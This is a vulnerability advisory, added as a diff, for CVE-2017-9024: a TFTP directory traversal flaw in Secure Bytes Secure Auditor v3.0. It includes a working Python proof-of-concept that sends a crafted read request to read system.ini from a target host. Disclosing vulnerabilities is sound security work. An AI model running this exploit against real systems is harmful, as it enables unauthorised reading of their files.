@@ -1,0 +1,99 @@
+[+] Credits: John Page aka HYP3RLINX	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/SECURE-AUDITOR-v3.0-DIRECTORY-TRAVERSAL.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+====================
+www.secure-bytes.com
+
+
+
+Product:
+=====================
+Secure Auditor - v3.0
+
+Secure Auditor suite is a unified digital risk management solution for conducting automated audits on Windows, Oracle and SQL databases
+and Cisco devices.
+
+
+
+Vulnerability Type:
+===================
+Directory Traversal
+
+
+
+CVE Reference:
+==============
+CVE-2017-9024
+
+
+
+Security Issue:
+================
+Secure Bytes Cisco Configuration Manager, as bundled in Secure Bytes Secure Cisco Auditor (SCA) 3.0, has a
+Directory Traversal issue in its TFTP Server, allowing attackers to read arbitrary files via ../ sequences in a pathname.
+
+
+
+
+Exploit/POC:
+=============
+import sys,socket
+
+print 'Secure Auditor v3.0 / Cisco Config Manager'
+print 'TFTP Directory Traversal Exploit'
+print 'Read ../../../../Windows/system.ini POC'
+print 'hyp3rlinx'
+
+HOST = raw_input("[IP]> ")
+FILE = '../../../../Windows/system.ini' 
+PORT = 69                                        
+ 
+PAYLOAD = "\x00\x01"                #TFTP Read 
+PAYLOAD += FILE+"\x00"              #Read system.ini using directory traversal
+PAYLOAD += "netascii\x00"           #TFTP Type
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(PAYLOAD, (HOST, PORT))
+out = s.recv(1024)
+s.close()
+
+print "Victim Data located on : %s " %(HOST)
+print out.strip()
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+==================================
+Vendor Notification: May 10, 2017
+No replies
+May 20, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
